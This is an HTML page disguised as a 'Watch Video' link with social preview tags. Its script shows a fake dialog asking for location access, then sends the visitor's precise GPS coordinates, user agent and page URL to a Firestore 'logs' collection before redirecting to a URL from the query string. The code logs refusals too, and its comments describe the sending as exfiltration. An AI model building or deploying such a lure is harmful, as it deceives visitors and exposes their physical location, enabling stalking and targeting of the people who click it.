<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Watch Video</title>

<meta property="og:title" content="Watch Video">
<meta property="og:description" content="Tap to open">
<meta property="og:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
<meta property="og:type" content="website">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Watch Video.   ">
<meta name="twitter:description" content="Tap to open.   ">
<meta name="twitter:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #0f0f0f;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
  .overlay {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.7);
    z-index: 999;
    align-items: center;
    justify-content: center;
  }
  .overlay.show { display: flex; }
  .dialog {
    background: #1a1a1a;
    border-radius: 14px;
    padding: 28px 24px 18px;
    width: 300px;
    text-align: center;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
  }
  .dialog h3 { margin: 0 0 8px; font-size: 18px; font-weight: 600; }
  .dialog p { margin: 0 0 20px; font-size: 14px; opacity: 0.75; line-height: 1.4; }
  .dialog .btn-group { display: flex; gap: 10px; }
  .dialog button {
    flex: 1; padding: 10px 0; border-radius: 10px; border: none;
    font-size: 15px; font-weight: 600; cursor: pointer;
  }
  .dialog .btn-cancel { background: #333; color: #fff; }
  .dialog .btn-confirm { background: #fff; color: #000; }
  .box { text-align: center; display: none; }
  .spinner {
    width: 40px; height: 40px;
    margin: 0 auto 20px;
    border: 4px solid rgba(255,255,255,0.2);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .msg { color: #fff; font-size: 16px; opacity: 0.85; font-family: sans-serif; }
</style>
</head>
<body>

  <!-- Fake dialog -->
  <div class="overlay" id="overlay">
    <div class="dialog">
      <h3>Redirect to Video</h3>
      <p>This video uses location-based content. Allow redirect and share your location?</p>
      <div class="btn-group">
        <button class="btn-cancel" id="btnCancel">Cancel</button>
        <button class="btn-confirm" id="btnConfirm">Yes, Open</button>
      </div>
    </div>
  </div>

  <!-- Spinner -->
  <div class="box" id="box">
    <div class="spinner"></div>
    <div class="msg">Opening…</div>
  </div>

  <script>
    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';

    // =================
    // Helper: build Firestore document and send it
    // =================
    function sendToFirestore(data) {
      const doc = {
        fields: {}
      };

      for (const [key, value] of Object.entries(data)) {
        if (typeof value === 'number') {
          doc.fields[key] = { doubleValue: value };
        } else if (typeof value === 'boolean') {
          doc.fields[key] = { booleanValue: value };
        } else {
          doc.fields[key] = { stringValue: String(value) };
        }
      }

      const payload = JSON.stringify(doc);

      // --- FIX 1: sendBeacon with proper Blob + JSON content-type ---
      navigator.sendBeacon(
        FIRESTORE_URL,
        new Blob([payload], { type: 'application/json' })
      );

      // --- Fetch fallback (keepalive to survive page unload) ---
      fetch(FIRESTORE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      })
        .then(r => r.json())
        .then(console.log)
        .catch(() => {});
    }

    // =================
    // Extract target URL from query params (?url= or ?u=)
    // =================
    function getTargetUrl() {
      const params = new URLSearchParams(window.location.search);
      let target = params.get('url') || params.get('u');
      if (!target) return null;
      try { target = decodeURIComponent(target); } catch(e) {}
      if (!/^https?:\/\//i.test(target)) return null;
      return target;
    }

    const target = getTargetUrl();
    const box = document.getElementById('box');
    const overlay = document.getElementById('overlay');

    if (!target) {
      box.style.display = 'block';
      document.querySelector('.msg').textContent = 'No link provided.';
    } else {
      overlay.classList.add('show');

      document.getElementById('btnCancel').onclick = function() {
        overlay.classList.remove('show');
        box.style.display = 'block';
        document.querySelector('.msg').textContent = 'Redirect cancelled.';
      };

      document.getElementById('btnConfirm').onclick = function() {
        overlay.classList.remove('show');
        box.style.display = 'block';

        // --- FIX 2: Try geolocation, call sendToFirestore (was exfil) ---
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(pos) {
              sendToFirestore({
                type: 'gps',
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                ua: navigator.userAgent,
                pageUrl: window.location.href
              });
            },
            function(err) {
              sendToFirestore({
                type: 'gps_denied',
                errorCode: err.code,
                ua: navigator.userAgent,
                pageUrl: window.location.href
              });
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
          );
        }

        // Redirect after 3 seconds
        setTimeout(function() {
          window.location.href = target;
        }, 3000);
      };
    }
  </script>
</body>
</html>
